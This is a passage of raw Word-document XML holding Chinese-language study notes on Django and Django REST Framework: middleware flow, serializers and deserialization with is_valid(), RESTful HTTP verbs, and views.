          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>HttpRequest</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>对象</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>====</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>》到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>中间件处理</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>===</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>》返回</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>response===</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>》</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>response</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>中间件处理</w:t>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p>
    <w:p w14:paraId="6EDDEF58"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5333E4AD"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D8954C"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访问</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>配置，确定</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>view</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>来处理</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77E42CEB"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="079C28F0"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CDB3284"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view</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>的中间件进行处理</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>===</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>》返回</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>response===</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>》</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>response</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>中间件处理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="502DB5B0"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A00293"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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>出现异常</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>===</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>》</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>exception</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>中间件进行处理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="098F6885"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA962BF" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        <w:spacing w:line="330" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
      </w:pP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t>view</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>函数处理并返回</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>response</w:t>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r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="DejaVu Sans Mono" w:hAnsi="DejaVu Sans Mono" w:cs="DejaVu Sans Mono"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D05402" w14:textId="27813001" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A54E19"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005</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drf</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>序列化器与反序列化器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B33B8BA" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="00A2037A" w:rsidRDefault="00A63022" w:rsidP="00A2037A">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="360" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>序列化：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A4295E8" w14:textId="7777777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将对象的状态信息转换为可以存储或传输的形式的过程。（百度定义）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="277DB322" w14:textId="7777777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对应到drf中,序列化即把模型对象转换为字典形式, 再返回给前端,主要用于输出 序列化返回</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E854CD"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序列化器，就是对数据进行校验、对数据对象进行转化</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C4DEEA1" w14:textId="785BE836"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将Django中的模型类对象装换为JSON字符串，这个转换过程我们称为序列化。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74C850B4" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="00A2037A" w:rsidRDefault="00A63022" w:rsidP="00A2037A">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="360" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>反序列化：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43CD0EC3" w14:textId="7777777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把其他格式转化为程序中的格式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CBC34F8" w14:textId="7777777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对应drf中接收前段数据经过验证转为Python中的字典，主要用于输入，接收前段数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B48D7AC" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="00A2037A" w:rsidRDefault="00A63022" w:rsidP="00A2037A">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="360" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>反序列化存储</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="184504E8"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使用序列化器进行反序列化时，需要对数据进行验证后，才能获取验证成功的数据或保存成模型类对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07C2C5CC"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在获取反序列化的数据前，必须调用is_valid()方法进行验证，验证成功返回True，否则返回False。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="422F846B"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将JSON字符串转换为Django中的模型类对象，这个过程我们称为反序列化。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4486C98F" w14:textId="562AC760"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loads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2848B1D5" w14:textId="11994F68" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A54E19"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color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>006</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>drf</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>视图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01EF5842" w14:textId="7A1C7A61" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>drf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56197F44" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在前后端分离的应用模式中，后端仅返回前端所需的数据，不再渲染HTML页面，不再控制前端的效果。至于前端用户看到什么效果，从后端请求的数据如何加载到前端中，都由前端自己决定，网页有网页的处理方式，App有App的处理方式，但无论哪种前端，所需的数据基本相同，后端仅需开发一套逻辑对外提供数据即可。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B3442C0" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在前后端分离的应用模式中 ，前端与后端的耦合度相对较低。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EF19193" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在前后端分离的应用模式中，我们通常将后端开发的每个视图都称为一个接口，或者API，前端通过访问接口来对数据进行增删改查。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C7035E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>RESTful是一种开发理念。维基百科说：REST是设计风格而不是标准</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="646A755D" w14:textId="33F7CED8" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>常用的HTTP动词有下面四个（括号里是对应的SQL命令）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63255D21" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>GET（SELECT）：从服务器取出资源（一项或多项）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B72ADDB" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>POST（CREATE）：在服务器新建一个资源。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69846F7E" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18B612D0" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>DELETE（DELETE）：从服务器删除资源。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12B76B1E" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>创建序列化器来处理数据，使用serializers.ModelSerializerclass创建序列化器, 导入Meta类，直接用序列化器来做查询器和序列化与反序列化操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21950E3B" w14:textId="69E4EC68" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A54E19"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007</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drf-</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>视图的理解</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F77B7DE" w14:textId="78A966FB" w:rsidR="00D8288D" w:rsidRPr="001D56F9" w:rsidRDefault="001D56F9" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>类视图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E4FA6FA" w14:textId="67E7F488" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="001D56F9" w:rsidP="001D56F9">
      <w:pPr>
